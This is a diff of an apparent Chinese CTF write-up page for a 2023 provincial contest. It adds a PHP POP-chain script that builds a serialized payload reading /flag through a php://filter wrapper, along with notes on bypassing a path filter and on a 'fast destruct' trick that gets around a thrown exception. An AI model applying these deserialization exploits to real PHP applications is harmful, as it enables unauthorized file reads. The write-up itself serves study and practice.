@@ -212,7 +212,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/ctf%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ffa2c4">ctf线上赛</a>
+                <a href="/blog/tags/ctf%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #03a9f4">ctf线上赛</a>
             </span>
             
         </span>
@@ -343,7 +343,7 @@ cookie<span class="token punctuation">:</span> <span class="token constant">PHPS
 <p>进入<code>go</code>方法，<code>($this-&gt;dark)();</code>对象当作函数处理</p>
 <p>触发<code>__invoke</code>，调用了不存在的方法</p>
 <p>触发<code>__call</code>，最后进入<code>getFlag()</code></p>
-<p>整个链子：（本地没打通，怪）</p>
+<p>整个链子：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">night</span>
 <span class="token punctuation">&#123;</span>
@@ -370,12 +370,16 @@ cookie<span class="token punctuation">:</span> <span class="token constant">PHPS
 <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">night</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">-></span><span class="token property">dark</span><span class="token operator">-></span><span class="token property">light</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">night</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">-></span><span class="token property">dark</span><span class="token operator">-></span><span class="token property">light</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">-></span><span class="token property">dark</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=/flag"</span><span class="token punctuation">;</span>
 <span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后在传参的时候会发现另一个问题，这里的参数实际上存在不可见的Unicode控制字符，复制整个代码到vscode里就会发现</p>
 <p><img src="/blog/2023/06/03/%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B2023/image-20230603214745469.png" alt="image-20230603214745469"></p>
 <p>所以直接复制这串为参数然后传参</p>
-<p>至于底下的过滤，用伪协议就能实现绕过了</p>
+<p>至于底下的过滤，不允许 <code>/，和 ../ </code>开头，用伪协议就能实现绕过了(官方wp使用<code>%00</code>绕过)</p>
+<p>但是传参后发现并没有出现flag，其实是被<code> throw new Exception(&#39;seino&#39;);</code> 影响到了</p>
+<p>我们可以通过 fast destruct 提前触发魔术方法，从而绕过 throw 语句，注意我们传递 payload 的时候，需要将最后面的 } 删掉（即删掉最后一个%7D）(by 官方wp，这里我还没理解)</p>
+<p><img src="/blog/2023/06/03/%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B2023/image-20230609005342058.png" alt="image-20230609005342058"></p>
+<p>获取base64编码的flag</p>
 <h2 id="unserialize-复现"><a href="#unserialize-复现" class="headerlink" title="unserialize(复现)"></a>unserialize(复现)</h2><blockquote>
 <p>反射类，原生类</p>
 </blockquote>
